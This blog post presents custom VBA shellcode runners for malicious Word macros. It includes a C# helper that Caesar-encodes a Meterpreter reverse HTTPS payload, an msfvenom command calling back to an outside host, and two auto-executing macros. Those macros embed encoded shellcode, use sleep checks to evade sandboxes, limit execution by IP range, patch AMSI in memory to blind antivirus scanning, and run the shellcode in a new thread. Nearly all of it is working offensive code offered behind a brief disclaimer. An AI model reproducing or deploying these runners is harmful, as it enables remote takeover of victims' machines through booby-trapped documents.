---
layout: post
title: Custom VBA-ShellCode Runner
categories: xdev
permalink: /:categories/vbarunner/
---  

All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!

###CUSTOM VBA SHELLCODE ENCRYPTER [HELPER] 
Generate a  vbapplication shellcode with the rat_helper.exe below
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace helper
{
	internal class Program
	{
		static void Main(string[] args)
		{
			byte[] buf = new byte[598] {
			0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,
			0x8b,0x52,0x0c,0x8b,0x52,0x14,0x31,0xff,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,
			0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,
			0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,
			0x85,0xc0,0x74,0x4c,0x01,0xd0,0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,
			0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,
			0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,
			0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,
			0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,
			0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
			0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,
			0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x00,0x00,0x00,
			0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,
			0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,
			0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,
			0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,
			0x6f,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,
			0x68,0xbb,0x01,0x00,0x00,0xe8,0x2f,0x01,0x00,0x00,0x2f,0x2d,0x72,0x50,0x4c,
			0x44,0x55,0x7a,0x71,0x52,0x61,0x52,0x33,0x5a,0x33,0x5a,0x6d,0x46,0x53,0x77,
			0x54,0x6a,0x67,0x63,0x36,0x43,0x41,0x53,0x4a,0x50,0x39,0x51,0x6d,0x39,0x48,
			0x57,0x50,0x4c,0x33,0x35,0x77,0x6e,0x4f,0x44,0x51,0x6b,0x45,0x64,0x6d,0x38,
			0x34,0x4c,0x47,0x54,0x52,0x41,0x39,0x77,0x61,0x33,0x56,0x38,0x67,0x5f,0x4a,
			0x41,0x53,0x75,0x4f,0x4f,0x48,0x51,0x4b,0x71,0x78,0x5a,0x4c,0x67,0x71,0x59,
			0x4c,0x65,0x6b,0x53,0x57,0x67,0x62,0x51,0x66,0x4e,0x6f,0x51,0x49,0x32,0x35,
			0x73,0x72,0x4f,0x37,0x35,0x33,0x4e,0x39,0x47,0x79,0x6f,0x6b,0x4a,0x41,0x6b,
			0x4c,0x4e,0x79,0x58,0x33,0x74,0x61,0x72,0x66,0x36,0x66,0x31,0x63,0x6a,0x74,
			0x46,0x48,0x6d,0x46,0x72,0x67,0x41,0x4d,0x4a,0x44,0x35,0x53,0x45,0x63,0x61,
			0x74,0x6c,0x45,0x43,0x4d,0x6d,0x6b,0x67,0x63,0x71,0x49,0x6d,0x65,0x2d,0x66,
			0x6e,0x30,0x36,0x4a,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,
			0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,
			0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,
			0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,
			0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,
			0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,
			0x4a,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,
			0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,
			0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,
			0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,
			0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,
			0x36,0x36,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
			// ceaser encoder
			byte[] encoded = new byte[buf.Length];
			for (int i = 0; i < buf.Length; i++)
			{
				encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
			}

			uint counter = 0;
			//convert byte array toa string using the String builder class
			StringBuilder hex = new StringBuilder(encoded.Length * 2);
			foreach (byte b in encoded)
			{
				hex.AppendFormat("{0:D}, ", b);
				counter++;
				if (counter % 50 == 0)
				{
					hex.AppendFormat("_{0}", Environment.NewLine);
				}
			}
			// print encoded shelllcode to screen
			Console.WriteLine("The VBA payload is: " + hex.ToString());
		}
	}
}

```

Now Input the output of the helper.exe {which is an encrypted reverse shellcode}into the VB shellcode runner below

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication


```js
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function MyMacro()
	Dim buf As Variant
	Dim addr As LongPtr
	Dim counter As Long
	Dim data As Long
	Dim res As Long
	Dim t1 As Date
	Dim t2 As Date
	Dim time As Long
	
'sleeper to bypass heuristic detection
	t1 = Now()
	Sleep (2000)
	t2 = Now()
	time = DateDiff("s", t1, t2)
	
	If time < 2 Then
		Exit Function
	End If

'shellcode generated with the helper
	buf = Array(254, 234, 145, 2, 2, 2, 98, 51, 212, 102, 141, 84, 50, 139, 231, 141, 84, 14, 141, 84, 22, 51, 1, 17, 185, 76, 40, 141, 116, 42, 51, 194, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 75, 119, 241, 84, 141, 84, _
18, 89, 141, 68, 62, 3, 210, 141, 66, 122, 135, 194, 118, 78, 3, 210, 82, 141, 90, 34, 141, 74, 26, 3, 213, 135, 203, 118, 62, 75, 51, 1, 141, 54, 141, 3, 216, 51, 194, 195, 209, 15, 174, 3, 201, 58, 226, 119, 246, 5, _
127, 250, 61, 127, 38, 119, 226, 90, 141, 90, 38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 90, 97, 92, 141, 20, 235, 130, 1, 1, 1, 95, _
106, 112, 103, 118, 2, 106, 121, 107, 112, 107, 86, 106, 78, 121, 40, 9, 1, 215, 51, 221, 85, 85, 85, 85, 85, 234, 64, 2, 2, 2, 79, 113, 124, 107, 110, 110, 99, 49, 55, 48, 50, 34, 42, 89, 107, 112, 102, 113, 121, 117, _
34, 80, 86, 34, 56, 48, 51, 61, 34, 86, 116, 107, 102, 103, 112, 118, 49, 57, 48, 50, 61, 34, 116, 120, 60, 51, 51, 48, 50, 43, 34, 110, 107, 109, 103, 34, 73, 103, 101, 109, 113, 2, 106, 60, 88, 123, 169, 1, 215, 85, _
85, 108, 5, 85, 85, 106, 189, 3, 2, 2, 234, 49, 3, 2, 2, 49, 47, 116, 82, 78, 70, 87, 124, 115, 84, 99, 84, 53, 92, 53, 92, 111, 72, 85, 121, 86, 108, 105, 101, 56, 69, 67, 85, 76, 82, 59, 83, 111, 59, 74, _
89, 82, 78, 53, 55, 121, 112, 81, 70, 83, 109, 71, 102, 111, 58, 54, 78, 73, 86, 84, 67, 59, 121, 99, 53, 88, 58, 105, 97, 76, 67, 85, 119, 81, 81, 74, 83, 77, 115, 122, 92, 78, 105, 115, 91, 78, 103, 109, 85, 89, _
105, 100, 83, 104, 80, 113, 83, 75, 52, 55, 117, 116, 81, 57, 55, 53, 80, 59, 73, 123, 113, 109, 76, 67, 109, 78, 80, 123, 90, 53, 118, 99, 116, 104, 56, 104, 51, 101, 108, 118, 72, 74, 111, 72, 116, 105, 67, 79, 76, 70, _
55, 85, 71, 101, 99, 118, 110, 71, 69, 79, 111, 109, 105, 101, 115, 75, 111, 103, 47, 104, 112, 50, 56, 76, 2, 82, 106, 89, 139, 161, 200, 1, 215, 139, 200, 85, 106, 2, 52, 234, 134, 85, 85, 85, 89, 85, 88, 106, 237, 87, _
48, 61, 1, 215, 152, 108, 12, 97, 106, 130, 53, 2, 2, 139, 226, 108, 6, 82, 108, 33, 88, 106, 119, 72, 160, 136, 1, 215, 85, 85, 85, 85, 88, 106, 47, 8, 26, 125, 1, 215, 135, 194, 119, 22, 106, 138, 21, 2, 2, 106, _
70, 242, 55, 226, 1, 215, 81, 119, 207, 234, 76, 2, 2, 2, 108, 66, 106, 2, 18, 2, 2, 106, 2, 2, 66, 2, 85, 106, 90, 166, 85, 231, 1, 215, 149, 85, 85, 139, 233, 89, 106, 2, 34, 2, 2, 85, 88, 106, 20, 152, _
139, 228, 1, 215, 135, 194, 118, 209, 141, 9, 3, 197, 135, 194, 119, 231, 90, 197, 97, 234, 109, 1, 1, 1, 51, 59, 52, 48, 51, 56, 58, 48, 54, 59, 48, 56, 56, 2, 189, 242, 183, 164, 88, 108, 2, 85, 1, 215)

'decryption routine
For i = 0 To UBound(buf)
	buf(i) = buf(i) - 2
Next i

	addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
	
	For counter = LBound(buf) To UBound(buf)
		data = buf(counter)
		res = RtlMoveMemory(addr + counter, data, 1)
	Next counter
	
	res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub

```

another of my custom VBA runner with AMSI bypass abd other goodies **read comments**

```js
Type MODULEINFO
  lpBaseOfDLL As Long
  SizeOfImage As Long
  EntryPoint As Long
End Type
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr

Function MyMacro()
 'Get current time, sleep 4 seconds, get time again.  If less than 4 seconds have passed, assume we are in a AV sandbox and exit without running rest of macro.
 Dim myTime
 myTime = Time
 Dim Timein As Date
 Timein = Date + myTime
 Sleep (4000)
 Dim second_time
 second_time = Time
 Dim Timeout As Date
 Timeout = Date + second_time
 Dim subtime As Variant
 subtime = DateDiff("s", Timein, Timeout)
 Dim vOut As Integer
 vOut = CInt(subtime)
 If subtime < 3.5 Then
    Exit Function
 End If
 'initialize variables
 Dim Is64 As Boolean
 Dim StrFile As String
 Dim check As Boolean
 Dim buf As Variant
 Dim addr As LongPtr
 Dim counter As LongPtr
 Dim data As String
 Dim res As LongPtr
 Dim ipcheck As Boolean
 ipcheck = False
 Dim inscope As String
 'define in scope IP's.  We can use wildcards here.
 inscope = "192.168.*"
 'Call ip check function.  Returns True if machine IP is in scope. If True, pass.  If False, exit.
 ipcheck = getMyIP(inscope)
 If ipcheck Then
 Else
    Exit Function
 End If
 'Dynamically resolve amsi.dll
 StrFile = Dir("c:\windows\system32\a?s?.d*")
 'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True.
 Is64 = arch()
 'Call amsi check function to determine if amsi.dll is loaded into Word. This is the case in word 2019+. Returns True if Amsi is found.
 check = amcheck(StrFile)
 'This portion to delete document body and replace with auto text (the "legit" content)
 'ActiveDocument.Content.Select
 'Selection.Delete
 'ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
 'If amsi is found, call amsi patching function.  Pass architecture of Word as additional arg to function.
 If check Then
     patch StrFile, Is64
 End If
 'Include shellcode for both x86 and x64.
 'also no encryption routine on this shellcode, might have to look into something like xor or rot or caeser cipher to strengten it
 If Is64 Then
    buf = Array(49, 125, 184, 25, 37, 29, 1, 53, 53, 53, 118, 134, 118, 133, 135, 125, 102, 7, 154, 125, 192, 135, 149, 125, 192, 135, 77, 125, 192, 135, 85, 134, 139, 125, 68, 236, 127, 127, 125, 192, 167, 133, 130, 102, 254, 125, 102, 245, 225, 113, _
	150, 177, 55, 97, 85, 118, 246, 254, 66, 118, 54, 246, 23, 34, 135, 125, 192, 135, 85, 118, 134, 192, 119, 113, 125, 54, 5, 155, 182, 173, 77, 64, 55, 68, 186, 167, 53, 53, 53, 192, 181, 189, 53, 53, 53, 125, 186, 245, 169, 156, _
	125, 54, 5, 133, 192, 125, 77, 121, 192, 117, 85, 126, 54, 5, 24, 139, 130, 102, 254, 125, 52, 254, 118, 192, 105, 189, 125, 54, 11, 125, 102, 245, 118, 246, 254, 66, 225, 118, 54, 246, 109, 21, 170, 38, 129, 56, 129, 89, 61, 122, _
	110, 6, 170, 13, 141, 121, 192, 117, 89, 126, 54, 5, 155, 118, 192, 65, 125, 121, 192, 117, 81, 126, 54, 5, 118, 192, 57, 189, 118, 141, 125, 54, 5, 118, 141, 147, 142, 143, 118, 141, 118, 142, 118, 143, 125, 184, 33, 85, 118, 135, _
	52, 21, 141, 118, 142, 143, 125, 192, 71, 30, 128, 52, 52, 52, 146, 125, 102, 16, 136, 126, 243, 172, 158, 163, 158, 163, 154, 169, 53, 118, 139, 125, 190, 22, 126, 252, 247, 129, 172, 91, 60, 52, 10, 136, 136, 125, 190, 22, 136, 143, _
	130, 102, 245, 130, 102, 254, 136, 136, 126, 239, 111, 139, 174, 220, 53, 53, 53, 53, 52, 10, 29, 67, 53, 53, 53, 102, 110, 103, 99, 102, 107, 109, 99, 105, 110, 99, 107, 107, 53, 143, 125, 190, 246, 126, 252, 245, 240, 54, 53, 53, _
	130, 102, 254, 136, 136, 159, 56, 136, 126, 239, 140, 190, 212, 251, 53, 53, 53, 53, 52, 10, 29, 8, 53, 53, 53, 100, 120, 161, 155, 101, 109, 138, 157, 148, 121, 130, 150, 169, 119, 107, 172, 123, 175, 101, 171, 125, 137, 134, 173, 151, _
	155, 125, 124, 119, 108, 175, 148, 142, 161, 133, 119, 106, 134, 127, 106, 106, 134, 136, 134, 138, 170, 109, 158, 132, 131, 109, 153, 154, 105, 137, 165, 125, 124, 163, 125, 143, 159, 155, 128, 150, 158, 164, 133, 109, 121, 160, 129, 135, 134, 157, _
	124, 120, 105, 139, 106, 163, 164, 128, 158, 156, 143, 165, 158, 141, 150, 166, 136, 109, 148, 162, 142, 124, 142, 109, 155, 153, 173, 174, 98, 109, 148, 159, 142, 135, 106, 125, 150, 167, 130, 143, 167, 152, 141, 119, 134, 132, 124, 167, 102, 162, _
	159, 160, 123, 126, 169, 163, 110, 131, 107, 155, 159, 109, 103, 165, 153, 168, 174, 138, 161, 105, 109, 165, 105, 142, 163, 98, 158, 173, 173, 162, 172, 125, 133, 164, 170, 107, 173, 139, 155, 153, 160, 162, 122, 170, 125, 168, 122, 137, 133, 157, _
	158, 155, 123, 158, 167, 133, 135, 175, 170, 134, 107, 156, 150, 121, 165, 133, 168, 155, 119, 148, 131, 132, 102, 106, 126, 165, 125, 110, 160, 120, 150, 134, 125, 157, 142, 53, 125, 190, 246, 136, 143, 118, 141, 130, 102, 254, 136, 125, 237, 53, _
	103, 221, 185, 53, 53, 53, 53, 133, 136, 136, 126, 252, 247, 32, 138, 99, 112, 52, 10, 125, 190, 251, 159, 63, 148, 125, 190, 38, 159, 84, 143, 135, 157, 181, 104, 53, 53, 126, 190, 21, 159, 57, 118, 142, 126, 239, 170, 123, 211, 187, _
	53, 53, 53, 53, 52, 10, 130, 102, 245, 136, 143, 125, 190, 38, 130, 102, 254, 130, 102, 254, 136, 136, 126, 252, 247, 98, 59, 77, 176, 52, 10, 186, 245, 170, 84, 125, 252, 246, 189, 72, 53, 53, 126, 239, 121, 37, 106, 21, 53, 53, _
	53, 53, 52, 10, 125, 52, 4, 169, 55, 32, 223, 29, 138, 53, 53, 53, 136, 142, 159, 117, 143, 126, 190, 6, 246, 23, 69, 126, 252, 245, 53, 69, 53, 53, 126, 239, 141, 217, 136, 26, 53, 53, 53, 53, 52, 10, 125, 200, 136, 136, _
	125, 190, 28, 125, 190, 38, 125, 190, 15, 126, 252, 245, 53, 85, 53, 53, 126, 190, 46, 126, 239, 71, 203, 190, 23, 53, 53, 53, 53, 52, 10, 125, 184, 249, 85, 186, 245, 169, 231, 155, 192, 60, 125, 54, 248, 186, 245, 170, 7, 141, _
	248, 141, 159, 53, 142, 126, 252, 247, 37, 234, 215, 139, 52, 10)
 Else
    buf = Array(49, 29, 196, 53, 53, 53, 149, 102, 7, 190, 26, 153, 192, 135, 101, 192, 135, 65, 192, 135, 73, 68, 236, 127, 91, 102, 52, 192, 167, 93, 102, 245, 225, 113, 150, 177, 55, 97, 85, 246, 4, 66, 54, 252, 126, 170, 36, 135, 140, 192, _
	135, 69, 192, 119, 113, 54, 5, 192, 117, 173, 186, 245, 169, 129, 54, 5, 133, 192, 125, 77, 192, 141, 85, 54, 8, 186, 254, 169, 113, 102, 52, 126, 192, 105, 192, 54, 11, 102, 245, 246, 4, 66, 225, 54, 252, 109, 21, 170, 41, 56, _
	178, 45, 112, 178, 89, 170, 21, 141, 192, 141, 89, 54, 8, 155, 192, 65, 128, 192, 141, 81, 54, 8, 192, 57, 192, 54, 5, 190, 121, 89, 89, 144, 144, 150, 142, 143, 134, 52, 21, 141, 148, 143, 192, 71, 30, 181, 52, 52, 52, 146, _
	157, 163, 154, 169, 53, 157, 172, 158, 163, 158, 137, 157, 129, 172, 91, 60, 52, 10, 102, 16, 136, 136, 136, 136, 136, 29, 115, 53, 53, 53, 130, 164, 175, 158, 161, 161, 150, 100, 106, 99, 101, 85, 93, 140, 158, 163, 153, 164, 172, 168, _
	85, 131, 137, 85, 107, 99, 102, 112, 85, 137, 167, 158, 153, 154, 163, 169, 100, 108, 99, 101, 112, 85, 167, 171, 111, 102, 102, 99, 101, 94, 85, 161, 158, 160, 154, 85, 124, 154, 152, 160, 164, 53, 157, 111, 139, 174, 220, 52, 10, 136, _
	136, 159, 56, 136, 136, 157, 240, 54, 53, 53, 29, 7, 53, 53, 53, 100, 168, 161, 122, 121, 122, 122, 153, 158, 102, 106, 125, 170, 109, 98, 148, 174, 159, 129, 98, 108, 151, 118, 155, 110, 140, 109, 164, 140, 154, 135, 104, 132, 134, 128, _
	101, 166, 159, 150, 142, 162, 154, 173, 124, 137, 126, 143, 151, 150, 160, 150, 151, 130, 141, 108, 129, 127, 156, 134, 98, 153, 138, 153, 124, 168, 128, 53, 133, 157, 140, 190, 212, 251, 52, 10, 190, 251, 136, 157, 53, 103, 29, 185, 136, 136, _
	136, 140, 136, 139, 157, 32, 138, 99, 112, 52, 10, 203, 159, 63, 148, 157, 181, 104, 53, 53, 190, 21, 159, 57, 133, 159, 84, 139, 157, 170, 123, 211, 187, 52, 10, 136, 136, 136, 136, 139, 157, 98, 59, 77, 176, 52, 10, 186, 245, 170, _
	73, 157, 189, 72, 53, 53, 157, 121, 37, 106, 21, 52, 10, 132, 170, 2, 29, 127, 53, 53, 53, 159, 117, 157, 53, 69, 53, 53, 157, 53, 53, 117, 53, 136, 157, 141, 217, 136, 26, 52, 10, 200, 136, 136, 190, 28, 140, 157, 53, 85, _
	53, 53, 136, 139, 157, 71, 203, 190, 23, 52, 10, 186, 245, 169, 4, 192, 60, 54, 248, 186, 245, 170, 26, 141, 248, 148, 29, 160, 52, 52, 52, 102, 110, 103, 99, 102, 107, 109, 99, 105, 110, 99, 107, 107, 53, 240, 37, 234, 215, 139, _
	159, 53, 136, 52, 10)

End If


'Create new space in memory within current process
 addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
 'Copy shellcode to newly created memory
 For counter = LBound(buf) To UBound(buf)
 data = Hex(buf(counter))
 patched ByVal (addr + counter), 1, ByVal ("&H" & data)
 Next counter
 'create thread to execute shellcode
 res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

 Function arch() As Boolean
 'check architecture of current word process
    #If Win64 Then
        arch = True
    #Else
        arch = False
    #End If
End Function

Public Function getMyIP(ipcheck As String) As Boolean
'uses WMI to get all IP's associated with machine.  Each one is then checked against the wildcarded IP/network.  If a match is found, returns True
    Dim objWMI As Object
    Dim objQuery As Object
    Dim objQueryItem As Object
    Dim vIpAddress
    Dim counter As Integer
    Dim ips() As String
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set objQuery = objWMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
    For Each objQueryItem In objQuery
        For Each vIpAddress In objQueryItem.ipaddress
            If CStr(vIpAddress) Like ipcheck Then
                getMyIP = True
            End If
        Next
    Next
End Function

Function amcheck(StrFile As String) As Boolean
'Checks for amsi.dll in word process. If found, returns True
Dim szProcessName As String
Dim mdi As MODULEINFO
Dim hMod(0 To 1023) As LongPtr
Dim res As LongPtr
amcheck = False
res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
For i = 0 To UBound(hMod)
    szProcessName = String$(50, 0)
    GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
    If Left(szProcessName, 8) = StrFile Then
        amcheck = True
   End If
Next i

End Function

Function patch(StrFile As String, Is64 As Boolean)
'patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.  The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them. 
' Depending on architecture these offsets vary, so a case is included for x86 and x64
Dim lib As LongPtr
Dim Func_addr As LongPtr
Dim temp As LongPtr
Dim old As LongPtr
Dim off As Integer

lib = getmod(StrFile)

If Is64 Then
    off = 96
Else
    off = 80
End If
Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
temp = VirtPro(ByVal Func_addr, 32, 64, 0)
patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
temp = VirtPro(ByVal Func_addr, 32, old, 0)

If Is64 Then
    off = 352
Else
    off = 256
End If
Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
temp = VirtPro(ByVal Func_addr, 32, 64, old)
patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
temp = VirtPro(ByVal Func_addr, 32, old, 0)

End Function

'macro name is test which calls the main method
Sub test()
 MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
```